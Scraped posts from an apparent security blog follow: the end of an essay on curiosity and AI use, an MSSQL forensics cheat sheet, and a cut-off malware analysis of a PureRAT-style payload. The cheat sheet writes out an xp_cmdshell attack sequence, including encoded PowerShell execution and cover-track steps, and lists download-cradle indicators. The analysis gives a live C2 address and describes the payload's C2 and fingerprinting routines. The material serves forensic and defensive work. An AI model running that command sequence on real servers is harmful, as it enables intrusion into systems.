\u0026ldquo;create forgetfulness in the learners\u0026rsquo; souls\u0026rdquo; because people would rely on external texts instead of internalising knowledge.\nIntellectual decline: People would become \u0026ldquo;hearers of many things\u0026rdquo; but remain \u0026ldquo;learners of nothing\u0026rdquo; appearing knowledgeable while actually understanding little.\nMental laziness: People would depend on the written word instead of exercising their cognitive abilities, weakening intellectual development.\nDoes this sound familiar? The printing press faced the same criticism. The calculator. Google. And now AI.\nReplace \u0026ldquo;Written Words\u0026rdquo; with \u0026ldquo;AI\u0026rdquo; and you have the exact same argument being made today. Word for word. The concern that we\u0026rsquo;ll appear or at least feel knowledgeable while trully understanding nothing. That we\u0026rsquo;ll externalise memory instead of developing internal understanding. That we\u0026rsquo;ll become mentally lazy.\nRight now I want you to use all your lived experience with these past technologies to try to predict how AI will affect us in the long term.\nSo what happened with writing? Socrates was right - we did externalise memory. I don\u0026rsquo;t have every malware sample, initial access vector, forms of persistence or IOC memorised. I don\u0026rsquo;t keep thousands of CVE details in my head. I look things up, I utilise other people\u0026rsquo;s knowledge to negate the need for me to memorise everything, and this makes me far more capable at my job, because I don\u0026rsquo;t have to reinvent the wheel on every new piece of malware or threat actor I come across, I can rely on the wealth of knowledge already out there in the community.\nIn the dialogue, Theuth argued that letters/written word would make people wiser and improve their memories, as well being a remedy for both forgetfulness and ignorance.\nWhich is exactly what has happened, we are wiser, we have better access to information than ever before. It made us capable of handling far more complex problems than any group of people could have possibly achieved in a pre-literate society. As we can build on hundreds of years of writing allowing us to free up our cognitive resources to think about higher-level problems instead of just memorising and processing those things in our direct sphere of influence.\nSo was Socrates fundamentally wrong? I don\u0026rsquo;t think so. We\u0026rsquo;ve also seen his concerns play out, I think most people would agree that there has been a deterioration of our direct memory capacity. Instead of memorising information itself, we memorise where to find it.\nFurthermore, Socrates worried about cognitive processing. That people would become \u0026ldquo;hearers of many things\u0026rdquo; but \u0026ldquo;learners of nothing.\u0026rdquo; That passive reading of text would replace active dialogue and debate. To me this means people taking things at face value rather than critically engaging with ideas through discussion. And we\u0026rsquo;ve seen this too in the modern day with the rise and pervasiveness of misinformation. People consuming content without critically evaluating it, sharing headlines without reading articles, accepting claims without internal debate, spreading lies designed to harm people.\nSo how can both Theuth and Socrates be right? How can writing have made us both wiser and less capable at the same time?\nThis is where curiosity comes in; I believe curiosity is the difference between someone who uses these tools to become truly remarkable, contributing beyond themselves, advancing society, progressing the human race. Whilst a lack of curiosity leads to someone who is at best a spectator, but at worst a detractor from society, constantly repeating lies and misinformation without any idea they\u0026rsquo;re being manipulated into harming others.\nEvery time we invent a new tool that externalises some cognitive function, we worry it\u0026rsquo;ll make us dumb. But time after time we find, if we utilise it right, it just shifts what we use our brains for, allowing us to focus on something more important. The key here is that we need to utilise our curiosity to find that next important thing.\nThought Experiment: Could You Do Your Job Without Even Having Read Some Form of Written Knowledge?\nI\u0026rsquo;ve worked with too many analysts over the years who have refused to utilise AI. Their reasons? Some variation of the age-old arguments raised by Socrates, that it will make us lazy, that we won\u0026rsquo;t truly understand things, that we\u0026rsquo;ll become dependent. Others echo more recent arguments from the age of automation, concerns that this technology will take people\u0026rsquo;s jobs, make certain skills obsolete, or fundamentally change the profession in ways we can\u0026rsquo;t control.\nThese arguments have been repeated over and over again whenever there\u0026rsquo;s a new technology that scares people. But here\u0026rsquo;s a thought experiment I pose to those analysts:\nLet\u0026rsquo;s make this concrete. Imagine you\u0026rsquo;re a SOC analyst or threat hunter. Now imagine you lose access to:\nAll threat intelligence blogs (Krebs on Security, The DFIR Report, etc.) IOC databases and threat feeds MITRE ATT\u0026amp;CK framework Vendor security advisories Detection engineering documentation Stack Overflow and technical forums Every cybersecurity book you\u0026rsquo;ve ever read Could you still do your job?\nBe honest. Could you investigate an incident without cross-referencing known TTPs? Could you write detections without looking up query syntax? Could you analyze malware without referencing unpacking techniques you learned from blog posts?\nI couldn\u0026rsquo;t. Not effectively.\nThe thing which makes us human is we always augmented our cognition with external tools. The difference isn\u0026rsquo;t whether we utilise tools, it\u0026rsquo;s whether we utilise them as crutches or as amplifiers.\nWhen you look up a MITRE technique, do you just copy the detection and move on? Or do you read the description, understand why it works, think about how an attacker might modify their approach, and adapt the detection to your environment? When you read a malware analysis blog post, do you just copy/paste the IOCs? Or do you follow the analyst\u0026rsquo;s reasoning, understand how they arrived at each conclusion, and think about how you\u0026rsquo;d approach similar samples? The difference is curiosity, writing didn\u0026rsquo;t make us dumb. It made us capable of greater complexity, but only if we stay curious about what we\u0026rsquo;re reading.\nThe Real Culprit # So if AI isn\u0026rsquo;t the problem, what is?\nI believe it\u0026rsquo;s the broader culture of convenience and passive consumption. We\u0026rsquo;ve been trained by algorithms that feed us exactly what will keep us engaged, which turns out to be fear, outrage, controversy, and dopamine hits. Not curiosity.\nThe trap isn\u0026rsquo;t that AI gives us answers. It\u0026rsquo;s that we\u0026rsquo;ve stopped asking good questions. We\u0026rsquo;ve stopped following up, stopped striving for deep understanding and AI makes this trap even easier to fall into. We no longer research deeply. We no longer spend hours comparing options against each other, weighing trade-offs, understanding nuances. We\u0026rsquo;re so overwhelmed by amount of information available and so accustomed to convenience that we just take the first answer we see. We no longer look under the bonnet to understand how things actually work.\nWhen you ask an AI \u0026ldquo;How do I detect Kerberoasting?\u0026rdquo; and copy-paste the detection rule without understanding how Kerberoasting works, why the detection looks for those specific events, or what false positives you might encounter. That\u0026rsquo;s not an AI problem, that\u0026rsquo;s a curiosity problem.\nThe same person who was too lazy to read the full report or clarify their understanding of a piece of malware or cyberattack, is the same person today just copy/pasting from AI. It\u0026rsquo;s just the tool changed, and made it easier for the rest of us to fall into this trap.\nCuriosity is a Muscle # I recently watched a video by Hank Green that perfectly articulated something I\u0026rsquo;ve been feeling but couldn\u0026rsquo;t quite put into words. He talks about curiosity not as an innate trait you either have or don\u0026rsquo;t, but as a muscle that gets stronger the more you utilise it.\nWatch the full video here: I Wasn\u0026rsquo;t Always Like This!! - Hank Green\nIf you didn\u0026rsquo;t watch the video, here are some key points to know before diving into the rest of this blog.\n\u0026ldquo;Curiosity makes everything feel more alive. It makes uncertainty less scary. It makes other people more interesting. It makes myself more interesting\u0026hellip; It also makes problems less scary because I can feel all of the other problems we have solved.\u0026rdquo;\n\u0026ldquo;At its core, science is just trying to ask questions in ways that get good answers. And that creates this iterative dialogue between us and ourselves and everything else.\u0026rdquo;\n\u0026ldquo;Curiosity is a muscle. And I have been incentivized to really exercise that muscle. And now my curiosity has been to the gym consistently for years. And he\u0026rsquo;s like intimidatingly big.\u0026rdquo;\nThis isn\u0026rsquo;t just about science, it\u0026rsquo;s about how we approach the universe itself. Curiosity is asking questions in ways that get good answers.\nI think he puts it perfectly with the title I Wasn't Always Like This!!. This is a cognitive function you have to practise, actively training your curiosity through years of striving to understand how things work, and it fundamentally changes how your brain works. Every tiny oddity becomes something worth investigating. Every question leads to three more questions.\nThis matters in cybersecurity more than most other fields. Threat hunting isn\u0026rsquo;t just about knowing what to look for, it\u0026rsquo;s about being curious enough to notice what doesn\u0026rsquo;t belong. When you see a PowerShell execution at 3 AM, do you mark it as suspicious and move on, or do you get curious? What was it trying to do? Why that time? What happened on the endpoint to lead to this?\nThe best analysts I know are insatiably curious. They don\u0026rsquo;t just run down detections, they wonder why things work the way they do. They pull threads. They ask \u0026ldquo;but why?\u0026rdquo; until they understand the full picture.\nWhere From Here? # Curiosity being a muscle means if you\u0026rsquo;ve let it atrophy, you can rebuild it. It just takes practise.\nStart to question everything. Everything I see or experience, I want to have some understanding of why things are the way they are. Why did they design that particular thing in that way? What changed, and what reason did it have for being changed? Just enough curiosity to look at everything one level deeper. Over time, every system or idea you spend time to understand makes it easier to understand the next, soon enough you\u0026rsquo;ll be amazed at the general understanding you develop about everything in the world around you!\nI can tell you exactly how every system and piece of machinery on a warship works, every sewage plant, water desalination system, gas turbine, missile guidance system and diesel engine, even though my job had nothing to do with any of those. Because over the time I spent on that ship, any time I saw something new, I would seek out answers until I was satisfied with my understanding of it. That wasn\u0026rsquo;t innate, it is the practised curiosity I have approached my life with.\nThe key is the follow-up question. When anyone/anything gives you an answer, be an annoying 5 year-old and ask why. Ask what would happen if you changed one variable. Ask what this connects to. Ask what you\u0026rsquo;re missing.\nComing full circle, treat AI like Hank Green treats the universe: as something to have a conversation with, not just extract answers from.\nFinal Thoughts # Curiosity isn\u0026rsquo;t dead, it\u0026rsquo;s just been resting. And AI, used intentionally, might be exactly what we need to develop the next generation of curious world-changers.\nBut curiosity requires active cultivation. It\u0026rsquo;s not something you have or don\u0026rsquo;t have, it\u0026rsquo;s something you practise or neglect.\nTools like writing, books, google, and AI are value-neutral. They amplify whatever approach you bring to them. If you approach them passively, they\u0026rsquo;ll make you passive. If you approach them actively and with curiosity, they\u0026rsquo;ll make you more capable of things you never knew possible.\nThis is where it gets exciting. What if instead of using AI to avoid learning, we used it for what it is a tool and utilise it to learn more effectively? That\u0026rsquo;s what Parts 2 and 3 of this series are about.\nIn Part 2, we\u0026rsquo;ll explore evidence-based learning frameworks and how AI can fit into them. We\u0026rsquo;ll look at the learning cycle and why understanding it matters before you start using AI as a study tool.\nStay curious folks, and I\u0026rsquo;ll leave you with this thought:\nThe question isn\u0026rsquo;t whether AI will make us stupider or smarter. The question is: What are you going to do with it?\n","date":"22 January 2026","externalUrl":null,"permalink":"/posts/curiosity_crisis_part1/","section":"Blog","summary":"AI isn’t making us stupider, our curiosity has been atrophying for years and AI just makes it visible. Learn why curiosity is a muscle you can rebuild and how to use AI as an amplifier, not a crutch.","title":"Learning in the AI Era - Part 1: The Curiosity Crisis","type":"posts"},{"content":"This Microsoft SQL Server cheat sheet is designed for digital forensics, incident response, and threat hunting. It covers registry paths, log file locations, attack indicators, and configuration analysis for Microsoft SQL Server. Perfect for SOC analysts, incident responders, and security investigators hunting for compromised SQL Server instances.\nQuick Reference # Common attack pattern from compromised SQL Server: # sqlservr.exe → cmd.exe → powershell.exe What to look for:\ncmd.exe or powershell.exe spawned by sqlservr.exe Parent process is SQL Server service process PowerShell with encoded commands (-enc, -encodedcommand) Download cradles (IEX, Invoke-WebRequest, wget) Unusual child processes from SQL Server Detection:\n# Find suspicious child processes of sqlservr.exe Get-WmiObject Win32_Process | Where-Object {$_.ParentProcessId -eq (Get-Process sqlservr).Id} Key Registry Paths # HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL{XX}.{INSTANCENAME}\\MSSQLServer\\ Key File Paths # C:\\Program Files\\Microsoft SQL Server\\MSSQL{XX}.{INSTANCENAME}\\MSSQL\\Log\\ERRORLOG C:\\Program Files\\Microsoft SQL Server\\MSSQL{XX}.{INSTANCENAME}\\MSSQL\\Data\\ C:\\Program Files\\Microsoft SQL Server\\MSSQL{XX}.{INSTANCENAME}\\MSSQL\\Backup\\ Key Processes # sqlservr.exe # Main SQL Server engine sqlagent.exe # SQL Server Agent (job execution) sqlbrowser.exe # Instance enumeration service launchpad.exe # R/Python external script execution Database File Extensions # Extension Description .mdf Primary data file .ndf Secondary data file .ldf Transaction log file .bak Backup file .trn Transaction log backup Instance Investigation # Identifying Exploited Instances # For the suspicious child process the parent process command line reveals instance:\n# Process: sqlservr.exe # Command line includes: -s {INSTANCENAME} Get-WmiObject Win32_Process -Filter \u0026#34;name=\u0026#39;sqlservr.exe\u0026#39;\u0026#34; | Select-Object CommandLine Instance Names \u0026amp; Mapping # HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL Maps instance names to their internal version identifiers Example: PRODUCTION → MSSQL15.PRODUCTION Use this to translate between friendly names and registry paths Registry Key Locations # Main Instance Configuration # HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQLServer\\ Key Subkeys:\nSubkey Description Parameters Startup parameters, master database locations SuperSocketNetLib Network configuration, protocols, ports CurrentVersion Installed version (may be spoofed/outdated) Audit Audit settings CPE Customer feedback settings ExtendedProcedures Extended stored procedures (xp_cmdshell) Startup Parameters # HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQLServer\\Parameters What to look for:\n-d # Master database file location (check for unusual paths) -e # Error log location (redirected logs) -l # Master log file location -T # Trace flags (persistence mechanism) Network Configuration # HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQLServer\\SuperSocketNetLib\\Tcp Check for:\nTcpPort # Port number (default: 1433) Enabled # Whether TCP/IP is enabled ListenOnAllIPs # 0 = specific IPs, 1 = all IPs Authentication Mode # HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQLServer -\u0026gt; LoginMode Value Mode Risk 1 Windows Authentication only More secure 2 Mixed Mode (Windows + SQL) Allows SQL authentication, often targeted Version Verification # Version Number Breakdown # Format: XX.X.XXXX.X\nVersion Product 16.0.xxxx.x SQL Server 2022 15.0.xxxx.x SQL Server 2019 14.0.xxxx.x SQL Server 2017 13.0.xxxx.x SQL Server 2016 12.0.xxxx.x SQL Server 2014 11.0.xxxx.x SQL Server 2012 10.50.xxxx.x SQL Server 2008 R2 10.0.xxxx.x SQL Server 2008 Version Location # C:\\Program Files\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQL\\Log\\ERRORLOG First lines show: Microsoft SQL Server YYYY - XX.X.XXXX.X (X64)\nCross-reference locations:\nsqlservr.exe file version in MSSQL\\Binn\\ (check last modified date) Check across all archived ERRORLOG.X files for recent updates Build number in ERRORLOG is authoritative Log File Analysis # Error Logs # Location:\nC:\\Program Files\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQL\\Log\\ Files:\nERRORLOG # Current error log ERRORLOG.1 # Most recent archived log ERRORLOG.2 # Second most recent ... ERRORLOG.6 # Oldest archived log What to look for:\nFailed login attempts # Multiple rapid attempts = brute force New logins created # Unauthorized account creation Configuration changes # sp_configure calls xp_cmdshell enable/disable events # Command execution capability Database attach/detach operations # Suspicious database operations Backup/restore operations # Unusual locations or timing Startup parameters changes # Persistence mechanisms Service restarts # Potential crash or forced restart SQL Agent Logs # C:\\Program Files\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQL\\Log\\SQLAGENT.OUT What to look for:\nJob execution history Suspicious scheduled tasks Failed job executions Jobs running PowerShell/cmd commands Audit Logs (if enabled) # C:\\Program Files\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQL\\Log\\*.sqlaudit Note: Requires SQL Server Audit to be configured\nWindows Event Logs (SQL Server Audit) # When SQL Server Audit is configured to write to Windows Security/Application logs:\n# Windows Application Event Log Event ID: 33205 # SQL Audit events (Application log) # Windows Security Event Log (requires special configuration) Event ID: 33205 # SQL Audit events (Security log - tamper-proof) Event ID: 24000 # SQL audit event Event ID: 24001 # Login succeeded Event ID: 24298 # Database login succeeded (action_id DBAS) Configuration Requirements:\nAudit object access policy must be configured using auditpol.exe SQL Server service account needs \u0026ldquo;generate security audits\u0026rdquo; permission Audit destination configured to write to Security or Application log Benefits: Security log entries are tamper-proof, ideal for compliance\nCommon Attack Indicators # xp_cmdshell Abuse # Registry evidence:\nHKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\MSSQLServer\\ExtendedProcedures In ERRORLOG:\nConfiguration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1 Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 0 to 1 Common attack pattern:\n-- Enable xp_cmdshell EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1; RECONFIGURE; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; RECONFIGURE; -- Execute commands EXEC xp_cmdshell \u0026#39;whoami\u0026#39;; EXEC xp_cmdshell \u0026#39;powershell -enc \u0026lt;base64\u0026gt;\u0026#39;; -- Disable xp_cmdshell (cover tracks) EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 0; RECONFIGURE; Failed Login Tracking # In ERRORLOG:\nLogin failed for user \u0026#39;sa\u0026#39;. Reason: Password did not match Login failed for user \u0026#39;admin\u0026#39;. Reason: Could not find login Login succeeded for user \u0026#39;NT AUTHORITY\\SYSTEM\u0026#39; Windows Security Event Log:\n4625 # Failed logon (filter by process: sqlservr.exe) 4624 # Successful logon (filter by process: sqlservr.exe) Suspicious Configuration Changes # Look for in ERRORLOG:\nsp_configure \u0026#39;show advanced options\u0026#39; # Often precedes malicious config sp_configure \u0026#39;Ole Automation Procedures\u0026#39; # Can be used for code execution sp_configure \u0026#39;Agent XPs\u0026#39; # SQL Agent extended procedures sp_configure \u0026#39;clr enabled\u0026#39; # CLR assemblies for code execution Identifying Services Using SQL Server # Network Connections Analysis # Look for established connections to the SQL Server port:\n# Find SQL Server process and connections Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 1433} | Format-Table # Check actual configured port Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\*\\MSSQLServer\\SuperSocketNetLib\\Tcp\u0026#34; -Name TcpPort Default ports:\nTCP 1433 (default instance) TCP 1434 (SQL Browser service - UDP) Dynamic ports (named instances) Service Dependencies # Registry:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\{ServiceName}\\DependOnService Look for MSSQL${INSTANCENAME} or SQLServerAgent in dependencies\nCommon services that depend on SQL Server:\nSystem Center Configuration Manager (SCCM/MECM) SharePoint Veeam Backup \u0026amp; Replication Windows Server Update Services (WSUS) Microsoft Dynamics Application Config Files # IIS Application Pools:\nC:\\Windows\\System32\\inetsrv\\config\\applicationHost.config Search for connection strings: Data Source=, Server=, Initial Catalog=\nApplication configuration files:\nC:\\Program Files\\{ApplicationName}\\*.config C:\\inetpub\\wwwroot\\{WebApp}\\web.config File types to check:\nFile Application Type web.config ASP.NET applications app.config .NET applications appsettings.json .NET Core applications Search for SQL Server connection strings\nLinked Servers (Server-to-Server) # Registry:\nHKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQLXX.{INSTANCENAME}\\Providers\\ Shows configured OLE DB providers for linked servers Indicates if this SQL Server connects to other databases Can be abused for lateral movement File System Locations # Default Installation Paths # C:\\Program Files\\Microsoft SQL Server\\MSSQL15.{INSTANCENAME}\\ ├─ MSSQL\\ │ ├─ Bin\\ (executables: sqlservr.exe, sqlcmd.exe) │ ├─ Data\\ (database files: .mdf, .ldf, .ndf) │ ├─ Log\\ (ERRORLOG, SQLAGENT logs) │ ├─ Backup\\ (default backup location) │ ├─ Jobs\\ (SQL Agent job scripts - rare) │ └─ Bin\\Resources\\ (system resources) If folders are missing, check:\nHKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL15.{INSTANCENAME}\\MSSQLServer\\Parameters -e tells you where the logs are being sent -d tells you where the master database is located Investigation Checklist # Initial Triage # Identify all SQL Server instances on the system Check authentication mode (Windows vs Mixed) Review network configuration and exposed ports Verify SQL Server version and patch level Check for recent service restarts Log Analysis # Review ERRORLOG for failed login attempts Search for xp_cmdshell enable/disable events Check for suspicious configuration changes Review SQL Agent job history Correlate with Windows Event Logs (4624, 4625, 33205, 24001) Configuration Review # Check startup parameters for unusual paths Review extended stored procedures configuration Verify linked server configurations Check for suspicious database attach operations Review backup/restore operations Inspect database names for SQL injection patterns Check for malicious CLR assemblies Network \u0026amp; Dependencies # Identify applications using this SQL Server Review connection strings in application configs Check for linked servers (lateral movement risk) Analyze network connections to/from SQL Server Review service dependencies Useful Commands # PowerShell - Instance Enumeration # # Find all SQL Server instances Get-ItemProperty \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL\u0026#39; # Get SQL Server process details Get-WmiObject Win32_Process -Filter \u0026#34;name=\u0026#39;sqlservr.exe\u0026#39;\u0026#34; | Select-Object ProcessId,CommandLine # Check SQL Server services Get-Service | Where-Object {$_.DisplayName -like \u0026#34;*SQL*\u0026#34;} PowerShell - Configuration Review # # Get authentication mode Get-ItemProperty \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL*\\MSSQLServer\u0026#39; -Name LoginMode # Get network configuration Get-ItemProperty \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL*\\MSSQLServer\\SuperSocketNetLib\\Tcp\u0026#39; # Get startup parameters Get-ItemProperty \u0026#39;HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL*\\MSSQLServer\\Parameters\u0026#39; Grep/Search Commands # # Search ERRORLOG for xp_cmdshell grep -i \u0026#34;xp_cmdshell\u0026#34; ERRORLOG* # Search for failed logins grep -i \u0026#34;login failed\u0026#34; ERRORLOG* | sort | uniq -c # Search for configuration changes grep -i \u0026#34;sp_configure\u0026#34; ERRORLOG* # Find potential command execution grep -iE \u0026#34;xp_cmdshell|sp_configure|Ole Automation\u0026#34; ERRORLOG* SQL Queries - Threat Hunting # -- Check for xp_cmdshell enabled EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;; -- List all logins and their roles SELECT name, type_desc, create_date, modify_date FROM sys.server_principals; -- Check for suspicious databases SELECT name, create_date, compatibility_level FROM sys.databases ORDER BY create_date DESC; -- List SQL Agent jobs SELECT job_id, name, enabled, date_created, date_modified FROM msdb.dbo.sysjobs; -- Check linked servers SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1; -- Review recent backups (unusual locations) SELECT database_name, backup_start_date, backup_finish_date, physical_device_name, user_name FROM msdb.dbo.backupset ORDER BY backup_start_date DESC; -- Find databases with suspicious names SELECT name FROM sys.databases WHERE name LIKE \u0026#39;%[;\u0026#39;\u0026#39;]%\u0026#39; OR name LIKE \u0026#39;%---%\u0026#39; OR name LIKE \u0026#39;%xp_%\u0026#39;; -- Check for CLR assemblies (code execution) SELECT name, permission_set_desc, create_date FROM sys.assemblies; Useful Tools # Tool Use sqlcmd Command-line query tool PowerUpSQL PowerShell toolkit for SQL Server attacks SQL Server Audit Tool Security auditing and compliance Process Monitor Monitor SQL Server process activity Wireshark Network traffic analysis References # Microsoft: Write SQL Server Audit events to Security log Ultimate Windows Security: SQL Server Event IDs ","date":"21 December 2025","externalUrl":null,"permalink":"/posts/sql_server_cheatsheet/","section":"Blog","summary":"Microsoft SQL Server forensics and threat hunting guide covering registry paths, log locations, attack indicators, and configuration analysis for compromised SQL Server instances.","title":"MSSQL Cheat Sheet","type":"posts"},{"content":" Introduction # After eight stages of obfuscation, loaders, stealers, droppers, and more obfuscation, we’ve arrived at the final payload. And this one doesn’t disappoint. Stage 9 is where all the scaffolding comes together: an obfuscated .NET Reactor–protected DLL that unpacks its configuration, establishes a secure channel to its command-and-control (C2) servers, and transforms into a fully fledged remote access trojan (RAT).\nIt leverages reflection to hide execution, TLS with pinned certificates for encrypted comms, and Protocol Buffers to structure its configs and tasking messages. More importantly, it fingerprints the host in detail from antivirus products and OS version, to idle time and crypto wallets before slipping into a modular task loop designed to pull down whatever plugins the operator needs.\nIf that sounds familiar, it the architecture and feature set line up neatly with PureRAT, a commercial malware family from the PureCoder ecosystem. While marketed as a general-purpose backdoor, in practice PureRAT acts as a flexible payload letting attackers bolt on other modules as needed.\nCatching up where we left off, we’re now dealing with Stage 9 a .NET Reactor–protected DLL, loaded entirely in-memory by the previous stage’s loader. Unlike traditional DLLs with exported entry points, this one hides behind reflection-based invocation, with execution routed through an obfuscated method call.\nMhgljosy.Formatting.TransferableFormatter.SelectFormatter()\nFIle Name: Mhgljosy.dll SHA265: e0e724c40dd350c67f9840d29fdb54282f1b24471c5d6abb1dca3584d8bac0aa Detection: No hits on VirusTotal — appears to be previously unknown.\nTraditional static analysis wasn’t viable here .NET Reactor makes life painful, filling binaries with junk logic, control-flow flattening, and encrypted strings. Dynamic analysis was the obvious path forward: let the loader drop the DLL into memory, attach dnSpy to the live process, and throw some breakpoints at key points inside the DLL.\nBut I’m still a sucker for static, so before switching gears I gave automated deobfuscators a shot. I cycled through a handful of them with limited results, until a colleague (shoutout to @RussianPanda9xx) suggested trying NETReactorSlayer:\nhttps://github.com/SychicBoy/NETReactorSlayer\nAnd it worked.\nThe tool stripped away enough layers of obfuscation to leave us with something far more legible. With the clutter reduced, we can use dnSpy to poke around again.\nNETReactorSlayer is straightforward to use: open the GUI, select your binary, and run it. It prints a log of what it is doing:\n[INFO] 7844 Proxied calls fixed. [INFO] 1078 Strings decrypted. [INFO] 587 Calls to obfuscator types removed. [INFO] Renaming obfuscated symbols... The key part here are symbol renaming, string decryption, and removing control-flow redirection. Together they turn a spaghetti mess into something you can actually read, navigate and debug.\nBack to dnSpy # Jumping back to Mhgljosy.Formatting.TransferableFormatter.SelectFormatter() in dnSpy, we can see what it looks like now. Still doesn’t make a tonne of sense, right? Well, it’s not a magic bullet you don’t get the answer on a silver platter. But trust me, this is soooooooo much better than what we had before. And once you start clicking around, the surrounding code begins to open up and make a lot more sense.\nAppDomain.CurrentDomain.UnhandledException += transferableFormatter.PostFormatter; SubscriberSpec.ReceiveAttachedSubscriber(); This simply tell the assembly to run PostFormatter whenever it encounters and error, then it runs SubscriberSpec.ReceiveAttachedSubscriber();. That makes ReceiveAttachedSubscriber our next pivot, while the exception handler is worth keeping in mind it could be abused to trigger PostFormatter deliberately.\nIn ReceiveAttachedSubscriber we immediately hit a base64 blob alongside the target method. Before diving into the method itself, lets quickly decode that blob as it might give us some quick wins.\nThe decoded output shows a GZip header. Easy enough we just add a GZip decompress stage into the recipe and run it again. It’s looking better, but still not quite there. To see what we’re missing, we check how the assembly itself handles it, right after the blob is decoded, it’s handed off to FormatConcreteFormatter().\nThat Serializer.Deserialize\u0026lt;T\u0026gt;() call comes from protobuf-net, a well-known .NET implementation of Google’s Protocol Buffers. So the attacker isn’t just cramming raw bytes into a struct they’re using a proper protobuf schema under the hood. Now lets add protobuf decoding to the recipe.\nThe config gives us an IP address, what look like port numbers, another base64 blob in the middle, and a few strings tacked on at the end. Decoding that blob next, we get:\nFrom the bytes 30 82 04 ea we can recognise ASN.1 DER (Distinguished Encoding Rules) encoding, most commonly used in X.509 certificates, PKCS#7/PKCS#12 bundles, or private key blobs.\nSure enough, looking back at the .NET assembly we see that just beneath the blob it’s instantiating an X.509 certificate. For the uninitiated, this is a standardised format defining the structure of a public key certificate. That already starts to shape our understanding of what ReceiveAttachedSubscriber is really doing.\nInside the C2 Function # Jumping back into the method and scrolling down, it becomes clear that its primary job is to set up a connection.\nI’m going to explain the full function up front, since it helps frame the rest of the analysis and we’ll dive into details as needed. The routine establishes a persistent TCP socket wrapped in an SslStream with custom certificate validation, tunnelling all traffic over TLS. It operates in a reconnect loop: after a short delay it disposes of any stale connection, spins up a new socket, and retries against one of its configured servers. Once connected, it sends an initial “hello,” starts a randomised 20–40 second keepalive timer, and enters a read loop that continuously processes new messages\\commands. Each incoming message is dispatched to a new thread, allowing tasks to run in parallel.\nBut were does the server details actually come from? The remote IP and port aren’t visible in plaintext. We already spotted an IP address earlier, so the next step is to trace its usage. Right-clicking on subscriberSharer (the field holding that base64 blob) and selecting Analyse shows us:\nThis view shows us everything that touches our base64 blob. In blue is a little spoiler for what’s coming, I’ll let you guess what PureHVNC might be for now.\nMore importantly, in red we can see that the blob is used by the MergeSubscriber method, which is called from the ReceiveAttachedSubscriber routine we’re currently dissecting. So the next logical step is to dive into MergeSubscriber.\nIt’s a straightforward but very telling loop:\nIterate over endpoints from subscriberSharer.ReflectChooser (Our config from earlier). Hostnames are resolved via DNS to all A records. Raw IPs skip DNS and are used directly. Iterate over ports from subscriberSharer.AddChooser. For each host/port pair, it attempts a connection with SubscriberSpec.m_BasicProfile.Connect(...). Success short-circuit – The first successful connection returns true, handing control back to ReceiveAttachedSubscriber to set up the TLS stream. This is textbook C2 pivoting behaviour. Rather than relying on a single hard-coded server, the malware cycles through multiple domains and ports until one responds, making takedown harder.\n\u0026#34;1\u0026#34;: \u0026#34;157.66.26.209\u0026#34;, \u0026#34;2\u0026#34;: [ 56001, 56002, 56003 Although, in our sample only a single address is present, but the framework clearly supports a broader, more resilient infrastructure.\nPulling the IP address up in Shodan shows it belongs to a Windows server in Vietnam. If you think back to Stage 5, we were already tracing links that pointed toward a Vietnamese actor using the handle “Lone None.” This fits neatly with that earlier lead and strengthens the attribution thread.\nSo once the connection is established — what happens next? # In the middle of the function there’s a big cluster of methods, this is where the real action kicks off. Let’s step through them and see what they’re doing.\nThe first call we hit is RequestSetSubscriber() This method queries Windows Management Instrumentation (WMI) under root\\SecurityCenter2 for the class AntiVirusProduct. It loops through the results and pulls the displayName values (e.g., Windows Defender, Kaspersky, etc.). If nothing is found, it falls back to \u0026quot;N/A\u0026quot;.\nIn short, it fingerprints the host’s security software and reports it back, giving the operator immediate awareness of what protections are in place.\nThe next call is PlaySubscriber(): This routine gathers a set of hardware identifiers (Win32_Processor.ProcessorId, Win32_DiskDrive.SerialNumber, Win32_PhysicalMemory.SerialNumber), then appends environment data such as the Windows domain name and the output of ParseSubscriber(). That helper method pulls Environment.UserName and, if available, Environment.UserDomainName, formatting it like user[DOMAIN].\nThe full string is then fed into FormatterCompressor.FormatRandomExplorer(...), which is simply a MD5 hash function. The result is cached in uppercase for consistency.\nIn short: PlaySubscriber() generates a stable, pseudo-unique fingerprint for the victim host by combining hardware serials with user/domain info, letting the C2 reliably distinguish between different machines.\nThen comes ListenConvertibleSubscriber() This method checks whether the host has a camera/webcam. It queries WMI (Win32_PnPEntity) for devices where PNPClass is Image or Camera, grabs their Caption names, and returns true if any are found.\nIn short: it tells the C2 if webcam capture is an option on the compromised machine.\nUp Next: 